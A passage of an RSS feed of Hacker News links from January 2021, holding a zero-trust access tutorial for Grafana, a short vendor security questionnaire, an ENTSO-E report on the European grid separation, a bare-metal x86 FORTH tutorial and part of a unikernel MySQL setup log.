user account, and now has access to much more than just the application needed.</span></p><blockquote id="viewer-53kp2"><span>Instead, what we really want is to <strong><em>only</em></strong> provide access to the one application and be very granular in who has access. With the addition of identity-aware sockets, this is now possible.</span></blockquote><h2 id="viewer-bo80k"><span>Demo time!</span></h2><p id="viewer-ep41j"><span>Alright, let‚Äôs give this a spin, demo time! In this demo, we‚Äôre making a Grafana instance that‚Äôs on a private network and behind two layers of NAT available to our employees as well as a contractor.</span></p><p id="viewer-3tb1b"><span>We‚Äôll start by setting up the socket and tunnel using the ‚Äú<em>mysocketctl connect</em>‚Äù command.</span></p><p id="viewer-d4s79"><span>This works great for demo‚Äôs; for more permanent setups, it‚Äôs recommended to use ‚Äú<em>mysocketctl</em> <em>socket create</em>‚Äù and ‚Äú<em>mysocketctl</em> <em>tunnel create</em>‚Äù so that you have a permanent DNS name for your service.</span></p><pre id="viewer-9m2bk"><span>mysocketctl connect \
   --port 3000 \
   --name "My Identity aware socket" \
   --cloudauth \
   --allowed_email_domains "mycorp.com" \
   --allowed_email_addresses "<a href="mailto:contractor1@gmail.com" target="_blank" rel="noopener">andree@toonk.io</a><a href="mailto:,john@doe.com" target="_blank" rel="noopener">,john@doe.com</a>"</span></pre><p id="viewer-4n3gg"><span>With this, we created a socket on the mysocket.io infrastructure, enabled authentication, and provided a list of authorization rules. The same command also created the secure tunnel to the closest mysocket.io tunnel server, and we‚Äôre forwarding port 3000 on localhost to the newly created socket.</span></p><p id="viewer-kdc9"><span>Next, we launch a Grafana container. For fun, I‚Äôm passing in my AWS cloudwatch credentials, so I can create some dashboards for my AWS resources. I‚Äôve configured grafana for proxy authentication. Meaning it will trust mysocket.io to do the authentication and authorization. Grafana will use the HTTP headers added by mysocket to determine the user information.</span></p><pre id="viewer-cdq3v"><span><span>[</span>auth<span>.</span>proxy<span>]</span>
enabled <span>=</span> <span>true</span>
header_name <span>=</span> <span>X</span><span>-</span>Auth<span>-</span>Email
header_property <span>=</span> username
auto_sign_up <span>=</span> <span>true</span>
headers <span>=</span> Email<span>:</span><span>X</span><span>-</span>Auth<span>-</span>Email</span></pre><p id="viewer-6vrn5"><span>The complete example grafana.ini config file I used can <a href="https://github.com/mysocketio/examples/tree/main/2021-01-14-authentication-zero-trust-grafana" target="_blank" rel="noopener"><u>be found here</u></a>. Now we‚Äôre ready to launch Grafana. I‚Äôm doing this from my laptop, using Docker.</span></p><pre id="viewer-7ubcl"><span>docker run <span>-</span>i <span>-</span>v grafana<span>.</span>ini<span>:</span><span>/</span>etc<span>/</span>grafana<span>/</span>grafana<span>.</span>ini \
 <span>-</span>e ‚Äú<span>GF_AWS_PROFILES</span><span>=</span><span>default</span>‚Äù \
 <span>-</span>e ‚ÄúGF_AWS_default_ACCESS_KEY_ID<span>=</span>$<span>ACCESS_KEY_ID</span>‚Äù \
 <span>-</span>e ‚ÄúGF_AWS_default_SECRET_ACCESS_KEY<span>=</span>$<span>SECRET_ACCESS_KEY</span>‚Äù \
 <span>-</span>e ‚ÄúGF_AWS_default_REGION<span>=</span>us<span>-</span>east<span>-</span><span>1</span>‚Äù \
 <span>-</span>p <span>3000</span><span>:</span><span>3000</span> grafana<span>/</span>grafana</span></pre><div id="viewer-ef9a1"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services" data-pin-media="https://static.wixstatic.com/media/3b930f_63a33419247f443da525a06363fbd946~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/3b930f_63a33419247f443da525a06363fbd946~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-9qova"><span>Grafana is now listening on localhost port 3000. The mysocket connection we created earlier is relaying authenticated and authorized traffic to that local socket. With that, we should now be able to test and see if we have access to Grafana.</span></p><h2 id="viewer-7qimt"><span>Wrapping up</span></h2><p id="viewer-7a5k3"><span>In this article, we introduced identity aware sockets. We saw how Mysocket users can easily enable authentication for their HTTP(S) based sockets and how OpenID connect is used for the authentication flow to Google, Facebook, or Github (for now). We then looked at how authorization rules can be added by either matching the email domain or even a list of email addresses.</span></p><p id="viewer-chch1"><span>With this, it‚Äôs now easy to provide access to internal applications, from any device, any time anywhere, without the need for a VPN.</span></p></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793432</guid>
            <pubDate>Fri, 15 Jan 2021 17:29:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Reddit Meets Twitter for Finance]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25793319">thread link</a>) | @minhhnguyen
<br/>
January 15, 2021 | https://www.sigmafinite.com/all | <a href="https://web.archive.org/web/*/https://www.sigmafinite.com/all">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><img src="https://www.sigmafinite.com/static/site_pictures/logo-light.jpg"></p><p><small>Copyright 2021 ¬© Sigma Finite Inc</small>
                    <small>London, UK. All rights reserved.</small>
                </p>
            </div></div>]]>
            </description>
            <link>https://www.sigmafinite.com/all</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793319</guid>
            <pubDate>Fri, 15 Jan 2021 17:18:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Our Dumb Security Questionnaire]]>
            </title>
            <description>
<![CDATA[
Score 147 | Comments 84 (<a href="https://news.ycombinator.com/item?id=25793230">thread link</a>) | @zdw
<br/>
January 15, 2021 | https://hangar.tech/posts/our-dsq/ | <a href="https://web.archive.org/web/*/https://hangar.tech/posts/our-dsq/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Last year, one of our startups needed to buy a SaaS product (case management and workflow software). There were several promising vendors, all with products that looked impressive. Technically, all had the features and APIs we were looking for. However, we had security concerns. We planned on storing extremely sensitive data in this tool, and wanted to understand their security posture before we selected a vendor.</p><p>This a common problem; you‚Äôve probably ran into it yourself. With SaaS software, how do you verify its security? As an industry, our answers are ‚Ä¶ poor. We have various certifications (PCI, HIPAA/HITECH, FedRAMP, etc), but all too often these are box-ticking exercises with no real security value ‚Äì just ask <a href="https://www.schneier.com/blog/archives/2020/12/russias-solarwinds-attack.html">SolarWinds</a>.</p><p>So, security teams often end up sending potential vendors a bunch of questions ‚Äì what Latacora calls a <a href="https://latacora.micro.blog/its-weird-to/">Dumb Security Questionnaire</a>. As the title implies, the practice ‚Ä¶ isn‚Äôt great. Most DSQs are full of questions with no security value (which explains why most security teams don‚Äôt actually read the responses!). But unfortunately, they‚Äôre also kinda the best we can do. Huge companies might be able to afford real human-powered security audits and convince vendors to allow them, but small startups like ours don‚Äôt have a better option than relying on DSQs.</p><p>As Latacora points out, it turns out there isn‚Äôt really a ton that you need to ask. As a startup, we‚Äôre not looking for our vendor to be Fort Knox; we just need to know that storing data with them is at least as safe as storing it internally. There are a limited number of likely ways that our vendor might get owned; we just need to ask about those few basic things. Latacora ends their post with this:</p><blockquote><p>Someone ‚Äî and I am not volunteering ‚Äî should write the DSQ that just nails these basic
things. 10 questions, no diagrams.</p></blockquote><p>Well, we tried; here it is.</p><h3 id="who-this-is-for">Who this is for</h3><p>This questionnaire is designed for smaller, probably early-stage companies who need to evaluate a vendor. It makes some assumptions:</p><ul><li>You have a security person (or team) who can evaluate the answers and is part of the decision-making process. If nobody‚Äôs going to read the answers, don‚Äôt waste your vendor‚Äôs time.</li><li><em>Your</em> answers to these questions are already pretty ok. If not, stop wasting time evaluating vendors. Just buy the thing and use the time you save to get your own house in order.</li><li>This is for some SaaS product that‚Äôll have particularly high security impact - i.e. a breach of the vendor would be a major, potentially company-ending event. If you‚Äôre just trying to decide which ticket tracking system to use, again: just buy one and move on.</li><li>You have no particular compliance requirements ‚Äì so you‚Äôre looking purely evaluate security posture, not compliance.</li></ul><h3 id="our-dumb-security-questionnaire">Our Dumb Security Questionnaire</h3><h4 id="1-please-answer-these-questions">(1) Please answer these questions:</h4><ol><li>If you use a cloud provider (GCP/AWS/Azure/etc):<ul><li>describe how credentials are provisioned, managed, and stored.</li><li>If an attacker gained access to an individual developer‚Äôs cloud
credentials, what actions could that attacker perform, and how would you
detect and respond to the breach?</li></ul></li><li>If you don‚Äôt use a cloud provider: why not?</li><li>Describe how staff authenticate to company services (e.g. servers, email, SaaS
products), particularly highlighting your use of password managers, 2FA, and
SSO.</li><li>What development practices do you use to protect against the OWASP Top 10?</li><li>Describe the steps a developer or operations person takes to push new code to production.</li><li>Have you had any security breaches in the last two years?<ul><li>If yes: please explain the breach, and provide copies of any postmortem/root cause analysis/after-action reports.</li></ul></li></ol><h4 id="2-and-please-provide-as-many-of-the-following-as-possible">(2) And, please provide as many of the following as possible:</h4><ol><li>A recent (last 12 months) penetration test report, with information on what
follow-ups/remediation steps were taken. Reports by an external firm are
preferable; internal tests are OK. A redacted summary is fine as long as it
includes basic vulnerability descriptions and severity levels.</li><li>Documentation on your organization‚Äôs Secure Development Lifecycle, or similar, if you
have them. If not, please summarize the steps you take to help engineers write secure
code.</li><li>A copy of any security training material provided to staff, particularly
software developers. A summary/description of classes and content is fine.</li><li>A link to your Vulnerability Disclosure Policy and/or bug bounty program. If you don‚Äôt
have either: please explain.</li></ol><p>(10 questions, no diagrams :)</p><h4 id="license">License</h4><p>This questionnaire is <a href="https://creativecommons.org/publicdomain/zero/1.0/">released to the public domain</a>. We‚Äôd appreciate it if you credit us if you release a
derivative of this, but do what you like.</p></article></div>]]>
            </description>
            <link>https://hangar.tech/posts/our-dsq/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793230</guid>
            <pubDate>Fri, 15 Jan 2021 17:13:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[System Separation in the Continental Europe Synchronous Area on 8 January 2021]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25793178">thread link</a>) | @andreasley
<br/>
January 15, 2021 | https://www.entsoe.eu/news/2021/01/15/system-separation-in-the-continental-europe-synchronous-area-on-8-january-2021-update/ | <a href="https://web.archive.org/web/*/https://www.entsoe.eu/news/2021/01/15/system-separation-in-the-continental-europe-synchronous-area-on-8-january-2021-update/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>On 8 January 2021 at 14:05 CET the synchronous area of Continental Europe was separated into two separated areas due to outages of several transmission network elements in a very short time. The route where the two areas were separated is the following:</p><p><img src="https://d33wubrfki0l68.cloudfront.net/e57eb58e915151390602cbb873b8422e952e5837/26de1/assets/graphics/uploads/first-image-mod.jpg" alt="" title="Figure 1 - Map of Continental Europe showing the two separated areas during the system event on 8 January 2021"></p><p><em>Figure 1 - Map of Continental Europe showing the two separated areas during the system event on 8 January 2021</em></p><p>At approximately 14:05 CET, the frequency in the North-West Area of Continental Europe initially decreased to a value of 49.74 Hz within a period of around 15 seconds. Afterwards, the frequency reached a steady state value of approximately 49.84 Hz. At the same time, the frequency in the South-East Area initially increased to a value of up to 50.6 Hz before settling at a steady state frequency between 50.2 Hz and 50.3 Hz. This can also be seen from the graph below.</p><p><img src="https://d33wubrfki0l68.cloudfront.net/af53041f1f9915046a980de1662f685154376b5c/304f8/assets/graphics/uploads/second-image-mod.png" alt="" title="Figure 2 - Frequency in Continental Europe during the event on 8 January 2021"></p><p><em>Figure 2 - Frequency in Continental Europe during the event on 8 January 2021</em></p><p>Due to the underfrequency in the North-West Area, the contracted interruptible services in France and Italy, in total around 1.7 GW, were disconnected in order to reduce the frequency deviation. These services are large customers, who are contracted by the respective Transmission System Operators (TSOs) disconnected if frequency drops under a certain threshold. In addition, 420 MW and 60 MW of supportive power were automatically activated from the Nordic and Great Britain Synchronous areas respectively. These countermeasures ensured that, already at 14:09 CET, the frequency deviation was limited to a deviation of around 0.1 Hz in the North-West Area from the nominal frequency of 50 Hz (see Figure 2).</p><p>Due to the large overfrequency in the South-East Area, automatic and manual countermeasures were activated (i.e. the reduction of the feed-in of generation units) in order to stabilise the frequency. Thus, at 15.05 CET the frequency deviation in the South-East Area could be limited to +0.1 Hz from the nominal frequency of 50 Hz (see Figure 2).</p><p>The automatic response and the coordinated actions taken by the TSOs in Continental Europe ensured that the situation was quickly restored to normal operations. Actions were coordinated between the TSOs in order to reconnect the two areas as fast as possible again. Therefore, the contracted interruptible services in Italy could be reconnected at 14:47 CET and in France at 14:48 CET. At 15:08 CET, both areas were connected again to one synchronous area in Continental Europe.</p><p>ENTSO-E has kept the European Commission and the Electricity Coordination Group composed of representatives of Member States informed.</p><p>ENTSO-E is also publishing today questions and answers with regards to this event. All information published is subject to the results of a detailed investigation on the event which is ongoing. The investigation is following the legal framework under the Commission Regulation (EU) 2017/1485 of 2 August 2017 (System Operation Guideline) whereby National Regulatory Authorities and ACER are invited to join together with TSOs in the Investigation Panel.</p><p>In line with the provisions of the Commission Regulation (EU) 2017/1485 of 2 August 2017 (System Operation Guideline), ENTSO-E will present the results of the investigation to the Electricity Coordination Group and will subsequently publish them once the analysis is completed.</p><p><strong><em>Questions and answers</em></strong></p><p><strong>What is a system separation?</strong></p><p>The transmission grids of the countries of Continental Europe are electrically tied together to operate synchronously at the frequency of approximately 50 Hz. An event on 8 January 2021 caused the Continental Europe synchronous area to separate into two areas, with an area in the South-East of Europe being temporarily operating in separation from the rest of Continental Europe.</p><p><strong>Is this the first time such an event happens in Continental Europe?</strong></p><p>The Continental Europe synchronous area is one of the largest interconnected synchronous electricity systems in the world in terms of its size and number of supplied customers. Such a kind of events can happen in any electric power system. System resilience and preparedness of system operators in charge have a decisive impact on the consequences of such events. A separation of the synchronous area with a much larger disturbance and impacts on customers took place in Continental Europe on the 4 November 2006. This event was extensively analysed and led to a number of substantial developments, like the European Awareness System (EAS) which is a platform allowing TSOs to exchange operational information in real time, enabling them to react immediately in case of unusual system condition. The TSOs are therefore well prepared in order to coordinate and manage such events and limit the consequences. This preparedness and a permanent observation of the system frequency allowed to resynchronize the two separated areas in a very short period of time.</p><p><strong>How are countermeasures coordinated in Continental Europe in case of frequency deviations?</strong></p><p>In Continental Europe, procedures are in place to avoid system disturbances and especially large frequency deviations with the risk of uncoordinated disconnection of customers or generation. The TSOs Amprion (Germany) and Swissgrid (Switzerland) are responsible for these procedures in their role as synchronous area monitor (SAM) in Continental Europe. The SAM continuously monitors the system frequency. In case of large frequency deviations, they inform all TSOs via the European Awareness System (EAS) and launch an extraordinary procedure for frequency deviations to coordinate countermeasures in a fast and effective manner in order to stabilize the system. One step of this procedure is a telephone conference by Amprion, Swissgrid, RTE (France), Terna (Italy) and REE (Spain). This teleconference took place at 14:09 CET on 8 January 2021. In the telephone conference, the situation was evaluated, the TSOs informed about countermeasures which were already activated. The TSOs of the North-West and South-East area also coordinated the actions for reconnection in order to reach one synchronous area in Continental Europe again.</p><p><strong>Were end customers disconnected? Were there any other consequences?</strong></p><p>Customers in the order of 70 MW in the North-West Area and in the order of 163 MW in the South-East Area were disconnected. Due to the high resilience of the interconnected network and the rapid response of European TSOs, the security of operation and electricity supply was not endangered. An important contribution to stabilizing the system was delivered by the previously contracted interruptible services, which were activated in France and Italy. Such contracts which have been agreed with customers allow the TSO to temporarily and automatically reduce their electrical consumption depending on the situation with the electric power system in real-time.</p><p><strong>What caused the separation?</strong></p><p>In line with the provisions of the System Operation Guideline, a detailed investigation is ongoing on the event. This includes a comprehensive analysis of large numbers of real-time recordings from protection devices and other electric power system elements. ENTSO-E will publish the results of this investigation as soon as the analysis is finalised.</p><p><strong>Press Contact:</strong> Claire Camus &nbsp;+32 476 975093 claire.camus@entsoe.eu</p></div></div></div></div>]]>
            </description>
            <link>https://www.entsoe.eu/news/2021/01/15/system-separation-in-the-continental-europe-synchronous-area-on-8-january-2021-update/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25793178</guid>
            <pubDate>Fri, 15 Jan 2021 17:09:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bare Metal x86 Forth]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25792694">thread link</a>) | @marksmillibend
<br/>
January 15, 2021 | https://ph1lter.bitbucket.io/blog/2021-01-15-baremetal-x86-forth.html | <a href="https://web.archive.org/web/*/https://ph1lter.bitbucket.io/blog/2021-01-15-baremetal-x86-forth.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<a href="https://ph1lter.bitbucket.io/index.html">(home)</a> <span>2021-01-15</span><br>
<img src="https://ph1lter.bitbucket.io/img/forth-screenshot.png">
<p>In this post I develop a simple
<a href="http://users.ece.cmu.edu/~koopman/forth/hopl.html">FORTH</a>
system which can be put on a USB stick and will boot on an x86 PC into an interactive
REPL. It's really just the beginning of a self-hosted development environment but it does have the basic ability to accept
keyboard input, display results on screen, execute FORTH words and enter integers.
</p>
<p>I'm exploring the idea of how <em>little</em> assembler we can use to bootstrap an interactive development environment on a new machine.
</p>
<h2> abstraction and portablity</h2>
<p>The less assembler we have to write to bootstrap our system, the less work we have to do to port the system onto another platform.
FORTH allows us to start writing the FORTH system in FORTH itself, long before we have anything as complicated as a self-hosted compiler
or assembler <span>We write forth words using assembler data definitions</span>.
</p>
<p>The aim is to write the minimum amount of assembler possible and start writing FORTH as early as possible. This will certainly not
provide the most speed/size efficient system, but will provide the most portable system.
</p>
<h2> x86 16-bit code</h2>
<p>I am forced to write this system in 16-bit x86 <em>real mode</em> assembler, the assembler of the 8086 processor which lives on in
every intel chip.
</p>
<p>The reason for this is that I want to make use of the BIOS code for accessing screen, keyboard and disk and the PC BIOS
only runs as long as the processor remains in <em>real mode</em>.
</p>
<p>Even if you are familiar with x86 assembler this, restricted machine, may be new to you.
</p>
<p>The system is built using the
<a href="https://nasm.us/"><code>nasm</code></a>
assembler
since it provides an easy way to develop 16-bit, x86 code and generate flat executables suitable for PC boot.
It also provides macros which make things easier.
</p>
<h2> FORTH allows for a very simple VM core</h2>
<p>With just 2 assembly routines, <code>enter</code> and <code>exit</code>, FORTH provides a VM core engine.
One must decide on registers to store the 2 required stacks (data and return) and also the code pointer and then these two routines
provide the engine for all FORTH control flow.
</p>
<p>I'll just assume that you know FORTH is a stack machine and all function/word arguments are passed explicitly on the data stack.
Calling a function/word just uses the name of that word. There is no parameter passing; parameters are expected to be on the stack.
</p>
<p>As usual the full code is linked at the end.
</p>
<h3> FORTH VM briefly described</h3>
<p>I'll try to describe the FORTH VM approach here briefly. Rather than using normal call/ret, FORTH takes control of this explicitly with
a return stack and jumps. FORTH functions (called words) can be seen as a vector of pointers to code (Code Field Addresses/CFA).
The machine's <em>code pointer</em> points at these vectors and jumps to the code pointed at by the vector entries (2 indirection levels).
To move to the next instruction/word/function we just increment the code pointer.
</p>
<p>To call another FORTH word we just point the code pointer to it's CFA vector and push the address of the next CFA so we can return here.
</p>
<p>Eventually we need to call <em>real</em> code. So all CFA's actually point
to assembler and we just jump there. For primitive words, this is fine. For FORTH words there is a special assembler prelude (called ENTER) which
actually does the return stack push, and the change of the code pointer to point to the current word's CFA vector.
<span>So the call is actually handled inside the callee rather than by the caller</span>.
</p>
<p>The <em>end</em> of a CFA vector is just another (primitive) FORTH word called <code>exit</code>. This contains assembler code to pop the
code pointer off the return stack and jump to it, thus continuing from the word after the one calling this word.
</p>
<p>This is a little mind-bending to explain, but the actual code to do it is shorter than even this brief description and is listed below.
</p>
<p>Here's some more info on the <em>threaded code</em> approach.
<a href="http://www.bradrodriguez.com/papers/moving1.htm">http://www.bradrodriguez.com/papers/moving1.htm</a>
</p>
<h3> VM register definitions and code</h3>
<p>I've chosen the following register setup for my code pointer and stacks (the 8086 is very limited, and there is not a lot of choice).
</p>
<ul><li>
register DI is code-pointer
</li><li>
register BP is return stack
</li><li>
register SP is data stack
</li></ul>
<p>I'll define some assembler macros to rename the chosen registers to more FORTH-like names:
</p>
<pre>%define codeptr di
%define rstack bp
%define dstack sp
</pre>
<p>As an example, the top-level function in this system looks like this. It begins with the <code>enter</code> prelude macro
and is then just a list of pointers to assembly code blocks, the final one being <code>exit</code>.
</p>
<pre>main:
  enter
  dw cls, lit, str_welcome, puts, interpret, exit
</pre>
<p>Here are the <code>enter</code> and <code>exit</code> macros which provide the VM code I need to inline in other places.
</p>
<p>Note that non-FORTH, primitive words don't actually use the return stack. They don't start with the <code>enter</code>
code and have their own <code>primexit</code> code at the end.
</p>
<pre>;; this asm code is inlined at the start of every forth word to setup the
;; code pointer to point at the start of the CFA vector
%define entry_code_len 18 ; must be updated if macro enter is changed
%macro enter 0
  rpush
  mov codeptr, [codeptr] ; code-pointer = this word's ENTER code
  add codeptr, entry_code_len ; offset code-pointer to just after ENTER code i.e. start of cfa vector
  next ; run first cfa in this word's cfa vector
%endmacro
;; this asm code is inlined at the end of every primitive/pure asm word
;; to continue executing with the next CFA in the vector
%macro primexit 0
  add codeptr, 2 ; move code-pointer to next cfa vector entry
  next
%endmacro
;; forth primitive used to exit forth words
exit:
  rpop
  next
</pre>
<p>Some other helper macros used above:
</p>
<pre>;; execute next word
%macro next 0
  jmp [codeptr]
%endmacro
;; push to return stack for forth word call
%macro rpush 0
  mov dx, codeptr
  add dx, 2
  sub rstack, 2
  mov word [rstack], dx
%endmacro
;; pop from return stack to resume after word call
%macro rpop 0
  mov codeptr, [rstack]
  add rstack, 2
%endmacro
</pre>
<h3> loops</h3>
<p>To write useful code we need loops. I've decided to use the tail-call approach to loops. <code>loop</code> allows a FORTH word
to return to its beginning and that's enough to implement loops. We find the current word's beginning (it's CFA vector)
by cheating. We look at the entry on the return stack. It points just after the word calling this one. If we step back
we can get the CFA for this word. Then we just skip the entry prelude assembler code and have a pointer to the CFA
vector for this word. We jump there and we have looped. Simple!
</p>
<pre>loop:
  ; jump back to start of current function (tail call)
  mov codeptr, [rstack] ; rpeek
  sub codeptr, 2
  mov codeptr, [codeptr] ; current word entry
  add codeptr, entry_code_len ; skip entry prelude to cfa vec
  next
</pre>
<h3> conditional branches</h3>
<p>Conditional exit is like normal exit at the end of a word (in fact exit can be used anywhere
in a word) but it only happens if the value popped off the stack is zero. Again this is enough to implement if/then/else and
while loops. You just need to make a separate word for each IF statement and exit early to avoid the body of the IF.
</p>
<pre>zexit:
  pop ax
  cmp ax, 0
  jnz .donothing
  rpop ; exit
  next
.donothing:
  primexit
</pre>
<p>In fact I initially just had conditional exit, but I later added a conditional jump which adds an offset to the code pointer if
the stack top is zero. It requires manually counting the offset from after the instruction to the next instruction and changing
that every time the intervening code changes length.
<span>a FORTH compiler would handle this automatically by providing an if/then/else construct.</span>
</p>
<pre>zjump:
  add codeptr, 2
  pop ax
  cmp ax, 0
  jnz .donothing
  add codeptr, [codeptr]
.donothing:
  primexit
</pre>
<p>Here's an example use of an unconditional <code>jump</code> instead of loop and a variant of <code>zexit</code>.
</p>
<pre>puts:
  enter
  dw dup, cfetch, zexitkeep, emit, inc, jump, -7*2, exit
</pre>
<h3> literals</h3>
<p>Since CFA vectors just have code addresses how do we get numbers/addresses on the data stack? There is a special primitive word
called <code>lit</code> which takes the next CFA in the vector, pushes it on the data stack and skips it (since it's not really a CFA).
</p>
<pre>lit:
  add codeptr, 2
  mov ax, [codeptr]
  push ax
  primexit
</pre>
<h2> Machine IO</h2>
<p>The only things we need to create a minimal, self-hosted, development environment on a platform are
</p>
<ul><li>
screen character output (think terminal)
</li><li>
keyboard input
</li><li>
basic disk access (for loading and saving text files)
</li></ul>
<p>The x86 BIOS provides reasonably simple interfaces to these which makes developing this system easier than for other platforms
(see discussion of ARM systems below).
</p>
<p>I started off proving that I can get the screen and keyboard working. With the eventual goal of having some kind of interactive REPL.
</p>
<p>Here we see <code>main</code>, the top-level entry word for the system. It's actually written in FORTH not assembler.
</p>
<ul><li>
First we have the <code>enter</code> macro (which adds in the assembler to make a block of code behave as a FORTH word).
</li><li>
Next we have the CFA vector, which is a list of CFA's (code addresses). This vector is
created using the NASM pseudo op <code>dw</code> (define word) which creates a list of inlined 16-bit constants. Each of these is the address of
an assembler routine. We also see <code>exit</code> at the end which is an assembler routine that knows how to return from a FORTH word.
</li></ul>
<p><span>Actually main is not allowed to return, and interpret is a loop.</span>
</p>
<pre>main:
  enter
  dw cls, lit, str_welcome, puts, interpret, exit
</pre>
<p>In <em>real FORTH</em> this would look something like this:
</p>
<pre>: main cls ." Welcome to FORTH!" interpret ;
</pre>
<p><span>where ." is a magical compiler immediate which puts the following string somewhere in memory and compiles in [lit, addr, puts] instead</span>
</p>
<h3> screen output</h3>
<p>The FORTH word <code>emit</code> puts a single character on screen and updates the cursor position for the next character.
We can build more complicated string output words on that basis.
</p>
<p>Here is the underlying bios call for character output and the FORTH word emit which calls it and keeps track of the cursor update.
I don't include the cursor update code since it's a bit involved. It uses conditionals to check overflow
and a global to keep the cursor position (see code linked at end).
</p>
<pre>;‚Ä¶</pre></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ph1lter.bitbucket.io/blog/2021-01-15-baremetal-x86-forth.html">https://ph1lter.bitbucket.io/blog/2021-01-15-baremetal-x86-forth.html</a></em></p>]]>
            </description>
            <link>https://ph1lter.bitbucket.io/blog/2021-01-15-baremetal-x86-forth.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792694</guid>
            <pubDate>Fri, 15 Jan 2021 16:35:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running MatterMost as a Unikernel]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25792618">thread link</a>) | @eyberg
<br/>
January 15, 2021 | https://nanovms.com/dev/tutorials/running-mattermost-as-unikernel | <a href="https://web.archive.org/web/*/https://nanovms.com/dev/tutorials/running-mattermost-as-unikernel">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                <p>Mattermost is an open source, private cloud slack
alternative written in Go and React. It has many integrations and can
can connect to mysql or postgres for persistence. While there are many
"hello world" tutorials out there for running the Nanos unikernel we
thought this would be a nice little example to showcase two things:</p>

<p>1) How to run a multi-node setup. Most web applications are more than
just one actual application - the canonical example would be a webapp
server and its corresponding database.</p>
<p>2) How to interact with taps and bridges for a faster networking
experience or if you wanted to build your own private cloud. (Creating taps,
today, will only work on Linux as the tuntaposx package does not work
anymore but we're looking at alternatives.)</p>

<p>Ready? Let's get started.</p>

                <h3>Running mysql as a Nanos unikernel</h3>

                <p>We start by running the mysql server as a unikernel.
We've created a convenient package to use and the only thing you need to
do is set your base volume size. You could create an external volume but
we'll leave that to a different article.</p>

<pre><code>{
  "BaseVolumeSz": "400m"
}
</code></pre>

<p>Now let's run mysql by creating a tap device and assigning it a
static ip:</p>

                <pre><code>‚ûú  mysql ops load mysql_5.7.29 -c config.json -p 3306 -b -t tap0 --ip-address 192.168.42.19
[mysqld --user=root --explicit_defaults_for_timestamp]
booting /home/eyberg/.ops/images/mysqld.img ...
assigned: 192.168.42.19
2021-01-11T17:45:54.942930Z 0 [Warning] The syntax '--log_warnings/-W' is deprecated and will be removed in a future release. Please use '--log_error_verbosity' instead.
2021-01-11T17:45:54.945335Z 0 [Warning] Insecure configuration for --secure-file-priv: Location is accessible to all OS users. Consider choosing a different directory.
2021-01-11T17:45:54.945564Z 0 [Note] mysqld (mysqld 5.7.29-0ubuntu0.18.04.1-log) starting as process 2 ...
2021-01-11T17:45:54.957853Z 0 [Note] InnoDB: PUNCH HOLE support available
2021-01-11T17:45:54.959551Z 0 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins
2021-01-11T17:45:54.961557Z 0 [Note] InnoDB: Uses event mutexes
2021-01-11T17:45:54.962979Z 0 [Note] InnoDB: GCC builtin __atomic_thread_fence() is used for memory barrier
2021-01-11T17:45:54.965371Z 0 [Note] InnoDB: Compressed tables use zlib 1.2.11
2021-01-11T17:45:54.967107Z 0 [Note] InnoDB: Using Linux native AIO
2021-01-11T17:45:54.968929Z 0 [Note] InnoDB: Number of pools: 1
2021-01-11T17:45:54.970498Z 0 [Note] InnoDB: Using CPU crc32 instructions
2021-01-11T17:45:54.974749Z 0 [Note] InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M
2021-01-11T17:45:54.985275Z 0 [Note] InnoDB: Completed initialization of buffer pool
2021-01-11T17:45:54.989751Z 0 [Note] InnoDB: If the mysqld execution user is authorized, page cleaner thread priority can be changed. See the man page of setpriority().
2021-01-11T17:45:55.008773Z 0 [Note] InnoDB: Highest supported file format is Barracuda.
2021-01-11T17:45:55.024639Z 0 [Note] InnoDB: Creating shared tablespace for temporary tables
2021-01-11T17:45:55.026961Z 0 [Note] InnoDB: Setting file './ibtmp1' size to 12 MB. Physically writing the file full; Please wait ...
2021-01-11T17:45:55.062911Z 0 [Note] InnoDB: File './ibtmp1' size is now 12 MB.
2021-01-11T17:45:55.065453Z 0 [Note] InnoDB: 96 redo rollback segment(s) found. 96 redo rollback segment(s) are active.
2021-01-11T17:45:55.068301Z 0 [Note] InnoDB: 32 non-redo rollback segment(s) are active.
2021-01-11T17:45:55.070845Z 0 [Note] InnoDB: 5.7.29 started; log sequence number 2631215
2021-01-11T17:45:55.073134Z 0 [Note] InnoDB: Loading buffer pool(s) from /var/lib/mysql/ib_buffer_pool
2021-01-11T17:45:55.075770Z 0 [Note] Plugin 'FEDERATED' is disabled.
2021-01-11T17:45:55.086078Z 0 [Note] InnoDB: Buffer pool(s) load completed at 210111 17:45:55
